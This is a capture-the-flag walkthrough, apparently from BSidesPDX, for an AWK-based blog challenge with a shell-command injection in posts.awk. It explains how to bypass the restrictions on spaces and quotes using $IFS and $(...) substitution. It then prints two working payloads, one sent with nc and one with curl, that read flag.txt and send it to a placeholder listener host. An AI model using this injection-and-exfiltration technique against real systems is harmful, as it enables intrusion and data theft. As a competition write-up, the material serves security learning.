# AWKward Blog: Walkthrough

There's an injectable shell command at `controllers/posts.awk:7`. To reach it, send a request to `/posts/<INJECTION_PAYLOAD>`.

Due to the way incoming HTTP requests are parsed, spaces are implicitly forbidden in payloads. Use the shell's internal field separator (`$IFS`) to get around this.

The injectable field is wrapped in double-quotes, which are are also disallowed in the input. Use substitution syntax (eg. `$(echo 123)`) to run commands in this context.

Some of the usual utilities for reverse shells and data exfiltration (netcat, telnet, etc.) are missing. There _are_ still a couple helpful programs available, however.

## The Author's Solution

Use `http@` to send requests out to a listener server, and put the flag in the URL path:
```bash
echo -e 'GET /posts/$(/usr/bin/http@${IFS}<LISTENER_HOST_OR_IP>${IFS}$(cat<flag.txt)${IFS}<LISTENER_PORT>) HTTP/1.1\r' | nc 127.1 8080
```

Or:
```bash
curl 'http://chal.ctf.bsidespdx.org:8080/posts/$(/usr/bin/http@$\{IFS\}<LISTENER_HOST_OR_IP>$\{IFS\}$(cat<flag.txt)$\{IFS\}<LISTENER_PORT>)' ```
